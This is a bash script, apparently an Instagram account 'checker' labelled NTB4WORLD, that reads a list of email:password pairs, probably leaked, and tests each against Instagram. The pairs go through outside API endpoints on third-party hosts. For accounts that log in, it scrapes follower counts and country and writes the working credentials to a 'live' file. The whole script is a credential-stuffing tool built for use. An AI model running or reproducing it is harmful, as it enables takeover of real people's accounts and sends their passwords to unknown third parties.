#!/bin/bash
# NTB 4 WORLD
#MinorityCode_
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
PUTIH='\033[1;37m'
header () {
printf "${RED}
  ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
  ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
  ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
  ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
  .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
     ${RED}------------------------------------${NOCOLOR}
           Checker By NTB4WORLD
     ${RED}------------------------------------${NOCOLOR}
"
}
igcheck(){
  apine=`curl -s "http://instarget.net/api.php?x=$1|$2"`
    apine=`curl -s "https://www.shirtikvahfrisco.org/apix.php?user=$1&pass=$2"`
	cox=$( echo "$apine" | grep -Po '(?<=authenticated": )[^",]*' )
    if [[ $cox == "true" ]]; then
    cux=`curl -s "https://www.instagram.com/${1}/" -H 'authority: www.instagram.com' -H 'cache-control: max-age=0' -H 'upgrade-insecure-requests: 1' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36' -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9' --compressed`
    getInfoNama=$( echo "$cux" | grep -Po '(?<=name":")[^"]*' | head -2 | tail -2)
    getFoll=$( echo "$cux" | grep -Po '(?<=userInteractionCount":")[^"]*')
    getCountry=$( echo "$cux" | grep -Po '(?<=country_code":")[^"]*')
    getUser=$( echo "$cux" | grep -Po '(?<=alternateName":")[^"]*')
    getFollowing=$(echo "$cux" | grep -Po '(?<=count":)[^}]*' | head -2 | tail -1)
    printf "${NOCOLOR}[$i]${GREEN}[LIVE] => $1:$2\n"
    echo "${GREEN} INFO : $getUser | Follower : $getFoll | Following : $getFollowing | Country : $getCountry
    "
    echo "$1|$2 | Follower : $getFoll | Following : $getFollowing" >> IG-LIVE.txt
    else
    printf "${NOCOLOR}[$i]${RED}[DIE] => $1:$2${NC} \n"
    echo "$1|$2" >> IG-DIE.txt
fi
}

header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    echo "[+] Calculate your mailist file"
    echo "############################"
    totalLines=`grep -c ":" $list`
    echo "There are $totalLines of list."
    echo "############################"
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
        emailna="${emailgblg[$i]}"
        kontol="${passwordna[$i]}"

        igcheck $emailna $kontol
    done